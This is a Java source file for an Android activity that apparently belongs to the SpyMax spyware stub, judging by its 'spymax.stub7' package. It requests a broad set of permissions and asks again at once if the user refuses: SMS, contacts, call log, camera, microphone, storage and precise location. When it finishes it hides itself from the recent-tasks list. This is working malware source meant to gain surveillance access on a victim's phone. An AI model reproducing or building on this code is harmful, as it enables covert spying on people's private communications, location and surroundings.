package spymax.stub7;

import android.Manifest;
import android.app.Activity;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;


import android.support.v4.app.ActivityCompat;


public class _ask_prim_ extends Activity {

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }
    @Override
    public void onCreate(Bundle v) {


        super.onCreate(v);
        try
        {
            ClassGen12.ClassGen12FOR_prim =true;




            int PERMISSION_ALL = 151;
            String[] PERMISSIONS = ClassGen3.PERMISSIONS();
            if(!hasPermissions(this, PERMISSIONS)){
                ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
            }

        }catch (Exception e ){ }


        // finish();

    }


    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //finish();
        switch (requestCode) {
            case 151:{
                if (grantResults.length >0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    ClassGen12.ClassGen12FOR_prim = false;
                    finish();
                }else
                {

                    String[] PERMISSIONS = {
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.CAMERA,
                            Manifest.permission.RECORD_AUDIO,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION
                    };

                    int PERMISSION_ALL = 151;
                    ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);


                }
            }
        }
    }


    // public boolean isback = false;

//    @Override
//    public boolean onKeyDown(int keyCode, KeyEvent event) {
//        isback =true;
//        _engine_wrk_.shown =false;
//        finish();
//        return super.onKeyDown(keyCode, event);
//    }

    @Override
    public void finish() {
        ClassGen3.asked =false;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }
}
